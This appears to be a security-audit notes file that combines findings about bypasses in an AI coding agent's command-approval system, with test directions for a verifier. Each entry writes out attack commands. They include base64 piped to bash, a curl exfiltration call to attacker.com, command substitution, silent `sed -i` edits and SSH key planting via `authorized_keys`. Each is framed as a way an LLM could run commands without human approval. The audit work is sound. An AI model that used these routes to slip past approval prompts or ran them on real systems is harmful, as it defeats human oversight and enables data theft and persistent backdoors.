# Cross-Model Seeds: Team-02

## CROSS-01: Universal IsDenied Bypass + Pipe Target Write = Unconditional File Write

**Source-A**: PH-01 (backward-reasoner) — Pipe target tee/bash bypass once `cat:tools/` is cached
**Source-B**: PH-11 (contradiction-reasoner) — `echo <base64> | base64 -d | bash` bypasses ALL IsDenied patterns
**Connection**: PH-01 identifies that pipe targets are never checked by prefix extraction; PH-11 identifies that IsDenied can be defeated via base64 encoding + pipe to bash. Combined: the two bypasses apply to THE SAME `|` split in `extractBashPrefix`. A command like `cat tools/a.go | base64 -d | bash` would: (a) not be denied by IsDenied (neither `cat` nor `base64 -d` nor `bash` alone matches a deny pattern as a pipe segment), (b) be approved via `cat:tools/` prefix, (c) execute decoded content as arbitrary bash commands.
**Combined hypothesis**: Any command structured as `<safeCmd> <tools/path> | <arbitrary pipeline>` will: (1) pass IsDenied regardless of the pipeline tail, (2) be auto-approved if the safe cmd's directory prefix is cached. The base64 bypass removes even the residual protection IsDenied provides against named dangerous tools in the pipeline.
**Test direction for causal-verifier**: Verify that `cat tools/safe.go | base64 -d | bash` passes both IsDenied and `extractBashPrefix` matching when `cat:tools/` is in the allowlist. Check specifically whether `bash` in the pipeline tail matches any deny pattern (IsDenied does NOT have `"bash"` as a deny pattern — only specific dangerous bash invocations are listed).

---

## CROSS-02: grep Multi-Path + Semicolon Injection = Chained Filesystem Exfiltration

**Source-A**: PH-06 (backward-reasoner) — semicolon injection bypasses extractBashPrefix's pipe-only split
**Source-B**: PH-17 (contradiction-reasoner) — grep reads multiple path arguments beyond the approved prefix
**Connection**: Both PH-06 and PH-17 target the same gap: `extractBashPrefix` evaluates only the FIRST path argument. PH-17 shows additional positional path arguments are ignored; PH-06 shows `;`-separated commands are also ignored. Combined, an LLM can: first get `grep:api/` approved, then issue `grep -r "" api/ /home/user/.ssh/; curl http://attacker.com/$(cat /tmp/out | base64)`.
**Combined hypothesis**: The approval scope can be expanded in two orthogonal dimensions simultaneously — extra positional paths (PH-17) AND extra commands after semicolons (PH-06) — on the same approved prefix. This compounds the scope expansion: one approved `grep:api/` prefix enables reading the entire filesystem via positional args, and also executing arbitrary commands via `;`.
**Test direction for causal-verifier**: Confirm that `grep -r "" api/ /etc/ ; id > /tmp/out` (a) extracts `grep:api/` as prefix, (b) is approved when `grep:api/` is stored, (c) bash executes both the grep against /etc/ and the id command.

---

## CROSS-03: Command Substitution + Non-TTY Fallback = Headless Session Full Bypass

**Source-A**: PH-04 (backward-reasoner) — command substitution `$()` inside a path arg bypasses extractBashPrefix
**Source-B**: PH-14 (contradiction-reasoner) — fallbackApproval behavior in non-TTY; if it defaults to deny, this is safe; but combined with other bypass...
**Connection**: In a non-TTY / piped session, `term.MakeRaw` fails, `fallbackApproval` is called. If the fallback reads from a closed/EOF stdin and defaults to ApprovalDeny, the attack is blocked. But: if `extractBashPrefix` already approves the command (via PH-04 command substitution), `RequestApproval` is NEVER called — so `fallbackApproval` is irrelevant. The command-substitution bypass works REGARDLESS of TTY state because it's triggered by the `IsAllowed` path, not the `RequestApproval` path.
**Combined hypothesis**: In CI/headless environments where interactive approval is impossible, an LLM that has already accumulated prefix entries can exploit PH-04 (command substitution) to execute arbitrary code without any human-visible prompt. The non-TTY environment eliminates the only remaining feedback channel.
**Test direction for causal-verifier**: Verify that with `cat:tools/` in the prefix allowlist, `cat tools/$(id)` bypasses `IsAllowed` return=true (no prompt needed) and executes the subshell — confirming that the TTY/non-TTY distinction is irrelevant for already-approved prefixes.

---

## CROSS-04: sed -i + Pipe Target = Double File Modification Vector

**Source-A**: PH-02 (backward-reasoner) — `sed -i` after `sed:tools/` approval modifies files in-place
**Source-B**: PH-16 (contradiction-reasoner) — `isCommandOutsideCwd` warning is advisory only; never shown for auto-approved commands
**Connection**: PH-02 shows `sed -i` modifies files; PH-16 confirms that even if `sed -i` targets a path outside cwd, the `isCommandOutsideCwd` warning is NEVER displayed when the command is auto-approved via prefix. The two findings apply to the same code path: once `sed:tools/` is cached, `sed -i 'payload' tools/deploy.sh` executes silently — no warning, no prompt, no log.
**Combined hypothesis**: The user who approved `sed 's/x/y/' tools/a.go` has no indication that subsequent `sed -i` commands are executing against their files. The visual warning system that WOULD have flagged outside-cwd access is suppressed by the auto-approval. This is a layered failure: (1) `sed` should not be in safeCommands for prefix approval, (2) the `-i` flag should be detected as a write modifier, (3) the warning system is architecturally unable to protect auto-approved commands.
**Test direction for causal-verifier**: Confirm code path where `sed -i 's/x/y/' tools/a.go` → `extractBashPrefix` returns `sed:tools/` → `IsAllowed` returns true → `RequestApproval` NOT called → `isCommandOutsideCwd` NOT evaluated → bash executes sed -i silently.

---

## CROSS-05: autoAllowPrefixes Script Execution + YoloMode = Layered Safety Disabled

**Source-A**: PH-08 (backward-reasoner) — YoloMode disables all approval prompts
**Source-B**: PH-12 (contradiction-reasoner) — autoAllowPrefixes include `make`, `go test`, `npm run` which can execute arbitrary code
**Connection**: PH-08 (YoloMode) and PH-12 (autoAllowPrefixes) are both currently mitigated separately — YoloMode requires user opt-in, autoAllowPrefixes is commented out. But CROSS-05 identifies a future-state risk: if the TODO comment at run.go:391-394 is re-enabled, the combination of YoloMode + autoAllowPrefixes would mean that ANY command starting with `make`, `go build`, `npm run`, etc. executes with no user interaction, no deny-list check (IsAutoAllowed bypasses even IsDenied in the intended flow), and no per-invocation oversight.
**Combined hypothesis**: Re-enabling `IsAutoAllowed` without first auditing the `autoAllowPrefixes` list for script-execution commands (`make`, `npm run`, `go test`) would introduce a class of zero-click RCE via LLM-directed build command injection. A compromised Makefile or package.json combined with an approved `make` or `npm run` call executes arbitrary code unconditionally.
**Test direction for causal-verifier**: Trace the intended `IsAutoAllowed` code path (currently commented) to confirm that `make`, `go test`, and `npm run` bypass BOTH IsDenied AND `RequestApproval` when re-enabled. Verify that no IsDenied check occurs before `IsAutoAllowed` returns true.

---

## CROSS-06: SSH authorized_keys Write via Pipe + $HOME Bypass of isCommandOutsideCwd

**Source-A**: PH-09 (backward-reasoner) — `| tee ~/.ssh/authorized_keys` not blocked (authorized_keys absent from deny list); pipe target not scoped
**Source-B**: PH-18 (contradiction-reasoner) — `$HOME` expansion bypasses `isCommandOutsideCwd`'s `~` detection partially
**Connection**: PH-09 demonstrates the specific attack vector (`| tee ~/.ssh/authorized_keys`); PH-18 shows that `$HOME/.ssh/authorized_keys` variant also bypasses `isCommandOutsideCwd`. The shared target is `.ssh/authorized_keys` being absent from ALL protection layers: (1) not in `denyPathPatterns`, (2) pipe tail not scoped by `extractBashPrefix`, (3) `$HOME` expansion not caught by `isCommandOutsideCwd`. The combined finding is that this specific target has ZERO defense layers.
**Combined hypothesis**: SSH key injection via `| tee ~/.ssh/authorized_keys` or `; echo <pubkey> >> $HOME/.ssh/authorized_keys` is completely undetected by every defense layer in the approval system: IsDenied misses it, extractBashPrefix ignores pipe tails, isCommandOutsideCwd misses $HOME expansion, and the denyPathPatterns list has a specific gap for `authorized_keys`. This is a zero-layer bypass for persistent SSH backdoor installation.
**Test direction for causal-verifier**: Verify that `cat tools/pubkey.go | tee ~/.ssh/authorized_keys` (a) passes IsDenied (no deny match), (b) extracts `cat:tools/` prefix (pipe tail ignored), (c) is auto-approved when `cat:tools/` is stored, (d) bash executes the tee write. Also check `echo "ssh-rsa AAAA..." >> $HOME/.ssh/authorized_keys` to confirm `isCommandOutsideCwd` misses `$HOME` expansion.
